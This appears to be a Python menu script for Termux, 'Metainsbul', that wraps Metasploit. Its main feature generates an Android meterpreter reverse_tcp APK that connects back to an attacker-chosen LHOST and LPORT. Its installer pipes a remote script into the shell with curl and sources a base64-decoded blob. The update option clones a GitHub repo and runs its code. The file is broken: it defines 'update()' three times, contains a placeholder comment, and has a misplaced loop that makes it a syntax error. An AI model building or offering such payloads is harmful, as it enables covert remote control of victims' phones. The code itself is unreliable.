import os

def build_payload():
    lhost = input("LHOST - ")
    lport = input("LPORT - ")
    apk_name = input("Payload Name - ")
    print("THE PAYLOAD IS AUTOMATICALLY MOVED TO YOUR Sdcard")
    print("JUST OPEN FILE MANAGER AND VISIT APKS OR JUST SCROLL DOWN")
    print("IN FOLDERS SECTION")

    msfvenom_command = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {apk_name}.apk"

    print(msfvenom_command)

    os.system(msfvenom_command)

    os.system(f"mv {apk_name}.apk /storage/emulated/0/")


def update():
    os.system("git clone https://github.com/KiNGEX1/Metainsbul.git")
    os.chdir("Metainsbul")
    os.system("chmod +x Meta.py")
    os.system("python Meta.py")


def update():
    os.system("git clone https://github.com/KiNGEX1/Metainsbul.git")
    os.chdir("Metainsbul")
    os.system("chmod +x Meta.py")
    os.system("python Meta.py")

# ... (rest of the code remains the same)

    
    
def update():
    os.system("git clone https://github.com/KiNGEX1/Metainsbul.git")
    os.chdir("Metainsbul")
    os.system("chmod +x Meta.py")
    os.system("python Meta.py")

def install_metasploit():
    os.system('''
   #!/data/data/com.termux/files/usr/bin/bash
clear
echo "
   
   
   
   ─────────▀▀▀▀▀▀──────────▀▀▀▀▀▀▀
──────▀▀▀▀▀▀▀▀▀▀▀▀▀───▀▀▀▀▀▀▀▀▀▀▀▀▀
────▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀──────────▀▀▀
───▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀──────────────▀▀
──▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀──────────────▀▀
─▀▀▀▀▀▀▀▀▀▀▀▀───▀▀▀▀▀▀▀───────────────▀▀
─▀▀▀▀▀▀▀▀▀▀▀─────▀▀▀▀▀▀▀──────────────▀▀
─▀▀▀▀▀▀▀▀▀▀▀▀───▀▀▀▀▀▀▀▀──────────────▀▀
─▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀───────────────▀▀
─▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀───────────────▀▀
─▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀───────────────▀▀
──▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀───────────────▀▀
───▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀───────────────▀▀▀
─────▀▀▀▀▀▀▀▀▀▀▀▀▀───────────────▀▀▀
──────▀▀▀▀▀▀▀▀▀▀▀───▀▀▀────────▀▀▀
────────▀▀▀▀▀▀▀▀▀──▀▀▀▀▀────▀▀▀▀
───────────▀▀▀▀▀▀───▀▀▀───▀▀▀▀
─────────────▀▀▀▀▀─────▀▀▀▀
────────────────▀▀▀──▀▀▀▀
──────────────────▀▀▀▀
───────────────────▀▀

   .......Installing Metasploit.........
   scprit by Gushmazuko Modified by KiNGEX
   
"
termux-setup-storage
apt update && apt upgrade -y
pkg install git -y
pkg install wget -y
pkg install wget curl openssh git -y
apt install ncurses-utils
pkg install ruby -y

center() {
  termwidth=$(stty size | cut -d" " -f2)
  padding="$(printf '%0.1s' ={1..500})"
  printf '%*.*s %s %*.*s\n' 0 "$(((termwidth-2-${#1})/2))" "$padding" "$1" 0 "$(((termwidth-1-${#1})/2))" "$padding"
}

# Loading spinner
center " Loading..."
source <(echo "c3Bpbm5lcj0oICd8JyAnLycgJy0nICdcJyApOwoKY291bnQoKXsKICBzcGluICYKICBwaWQ9JCEKICBmb3IgaSBpbiBgc2VxIDEgMTBgCiAgZG8KICAgIHNsZWVwIDE7CiAgZG9uZQoKICBraWxsICRwaWQgIAp9CgpzcGluKCl7CiAgd2hpbGUgWyAxIF0KICBkbyAKICAgIGZvciBpIGluICR7c3Bpbm5lcltAXX07IAogICAgZG8gCiAgICAgIGVjaG8gLW5lICJcciRpIjsKICAgICAgc2xlZXAgMC4yOwogICAgZG9uZTsKICBkb25lCn0KCmNvdW50" | base64 -d)

echo
center "*** Dependencies installation..."

## Remove not working repositories
#rm $PREFIX/etc/apt/sources.list.d/*

## Install gnupg required to sign repository
# pkg install -y gnupg

## Sign gushmazuko repository
# curl -fsSL https://raw.githubusercontent.com/gushmazuko/metasploit_in_termux/master/gushmazuko-gpg.pubkey | gpg --dearmor | tee $PREFIX/etc/apt/trusted.gpg.d/gushmazuko-repo.gpg

## Add gushmazuko repository to install ruby 2.7.2 version
# echo 'deb https://github.com/gushmazuko/metasploit_in_termux/raw/master gushmazuko main'  | tee $PREFIX/etc/apt/sources.list.d/gushmazuko.list

## Set low priority for all gushmazuko repository (for security purposes)
## Set highest priority for ruby package from gushmazuko repository
# echo '## Set low priority for all gushmazuko repository (for security purposes)
# Package: *
# Pin: release gushmazuko
# Pin-Priority: 100

## Set highest priority for ruby package from gushmazuko repository
# Package: ruby
# Pin: release gushmazuko
# Pin-Priority: 1001' | tee $PREFIX/etc/apt/preferences.d/preferences

# Purge installed ruby
#apt purge ruby -y
#rm -fr $PREFIX/lib/ruby/gems

pkg upgrade -y -o Dpkg::Options::="--force-confnew"

# needs binutils
pkg install -y binutils python autoconf bison clang coreutils curl findutils apr apr-util postgresql openssl readline libffi libgmp libpcap libsqlite libgrpc libtool libxml2 libxslt ncurses make ncurses-utils ncurses git wget unzip zip tar termux-tools termux-elf-cleaner pkg-config git ruby -o Dpkg::Options::="--force-confnew" python-pip

python3 -m pip install --upgrade pip
python3 -m pip install requests


# if any weird warning occurs maybe its becoze of bigdecimal & pg_ext.so . try comment those lines if problem persist

echo
center "*** Fix ruby BigDecimal"
source <(curl -sL https://github.com/termux/termux-packages/files/2912002/fix-ruby-bigdecimal.sh.txt)

echo
center "*** Erasing old metasploit folder..."
#rm -rf $PREFIX/opt/metasploit-framework

echo
center "*** Downloading..."
cd /data/data/com.termux/files/home
git clone https://github.com/rapid7/metasploit-framework.git --depth=1

echo
center "*** Installation..."
cd /data/data/com.termux/files/home/metasploit-framework
# sed '/rbnacl/d' -i Gemfile.lock
# sed '/rbnacl/d' -i metasploit-framework.gemspec
sed -i 's/nio4r (2.5.8)/nio4r (2.5.9)/' Gemfile.lock

#sed -i "277,\$ s/2.8.0/2.2.0/" Gemfile.lock

gem install bundler
declare NOKOGIRI_VERSION=$(cat Gemfile.lock | grep -i nokogiri | sed 's/nokogiri [\(\)]/(/g' | cut -d ' ' -f 5 | grep -oP "(.).[[:digit:]][\w+]?[.].")
#sed 's|nokogiri (1.*)|nokogiri (1.8.0)|g' -i Gemfile.lock

gem install nokogiri -v $NOKOGIRI_VERSION -- --use-system-libraries

# for aarch64 if nokogiri problem persist do this 

#bundle config build.nokogiri "--use-system-libraries --with-xml2-include=$PREFIX/include/libxml2"; bundle install

gem install actionview -v 7.0.0
bundle update activesupport
bundle update --bundler
bundle install -j$(nproc --all)
bundle update --bundler

#$PREFIX/bin/find -type f -executable -exec termux-fix-shebang \{\} \;
# rm ./modules/auxiliary/gather/http_pdf_authors.rb
if [ -e $PREFIX/bin/msfconsole ];then
	rm $PREFIX/bin/msfconsole
fi
if [ -e $PREFIX/bin/msfvenom ];then
	rm $PREFIX/bin/msfvenom
fi
if [ -e $PREFIX/bin/msfrpcd ];then
	rm $PREFIX/bin/msfrpcd
fi
ln -s /data/data/com.termux/files/home/metasploit-framework/msfconsole $PREFIX/bin/
ln -s /data/data/com.termux/files/home/metasploit-framework/msfvenom $PREFIX/bin/
ln -s /data/data/com.termux/files/home/opt/metasploit-framework/msfrpcd $PREFIX/bin/

termux-elf-cleaner $PREFIX/lib/ruby/gems/*/gems/pg-*/lib/pg_ext.so

echo
center "*"
echo -e "\033[32m Suppressing Warnings\033[0m"

# sed -i '355 s/::Exception, //' $PREFIX/bin/msfvenom
# sed -i '481, 483 {s/^/#/}' $PREFIX/bin/msfvenom


# sed -Ei "s/(\^\\\c\s+)/(\^\\\C-\\\s)/" $PREFIX/opt/metasploit-framework/lib/msf/core/exploit/remote/vim_soap.rb

# Warning occurs during payload generation
#sed -i '86 {s/^/#/};96 {s/^/#/}' $PREFIX/lib/ruby/gems/3.1.0/gems/concurrent-ruby-1.0.5/lib/concurrent/atomic/ruby_thread_local_var.rb
#sed -i '442, 476 {s/^/#/};436, 438 {s/^/#/}' $PREFIX/lib/ruby/gems/3.1.0/gems/logging-2.3.1/lib/logging/diagnostic_context.rb

## openssl issue has been fixed 

#sed -i '13,15 {s/^/#/}' $PREFIX/lib/ruby/gems/3.1.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/encryption_algorithm/functionable.rb
#sed -i '14 {s/^/#/}' $PREFIX/lib/ruby/gems/3.1.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb
#sed -i '14 {s/^/#/}' $PREFIX/lib/ruby/gems/3.1.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp384.rb
#sed -i '14 {s/^/#/}' $PREFIX/lib/ruby/gems/3.1.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp521.rb

echo
center "*"
echo -e "\033[32m Installation complete. \n Launch metasploit by executing: msfconsole\033[0m"
center "*"

    ''')

def launch_metasploit():
    os.system("msfconsole")
    


while True:
    
    
    
    import time

def loading_animation(iterations, delay=0.1):
    for _ in range(iterations):
        print("Loading" + "#" * _ + "." * (iterations - _), end="\r")
        time.sleep(delay)

while True:
    loading_animation(5) 

    # Your existing code
    print("███╗░░░███╗███████╗████████╗░█████╗░██╗███╗░░██╗░██████╗██████╗░██╗░░░██╗██╗░░░░░")
    print("████╗░████║██╔════╝╚══██╔══╝██╔══██╗██║████╗░██║██╔════╝██╔══██╗██║░░░██║██║░░░░░")
    print("██╔████╔██║█████╗░░░░░██║░░░███████║██║██╔██╗██║╚█████╗░██████╦╝██║░░░██║██║░░░░░")
    print("██║╚██╔╝██║██╔══╝░░░░░██║░░░██╔══██║██║██║╚████║░╚═══██╗██╔══██╗██║░░░██║██║░░░░░")
    print("██║░╚═╝░██║███████╗░░░██║░░░██║░░██║██║██║░╚███║██████╔╝██████╦╝╚██████╔╝███████╗")
    print("╚═╝░░░░░╚═╝╚══════╝░░░╚═╝░░░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝╚═════╝░╚═════╝░░╚═════╝░╚══════╝")
    print(" By KiNGEX | https://GitHub.com/KiNGEX1")
    print("__________________________________________")
    
    print("Options:")
    print("1. Build Payload")
    print("2. Install Metasploit")
    print("3. Launch Metasploit")
    print("4. Update Metainsbul (Recommend)") 
    print("5. Exit")

    choice = input("Enter your choice: ").strip()

    if choice == '1':
        build_payload()
    elif choice == '2':
        install_metasploit()
    elif choice == '3':
        launch_metasploit()
    elif choice == '4':
        update()
    elif choice == '5':
        break
    else:
        print("Invalid choice. Please select a valid option.")
        
        
        
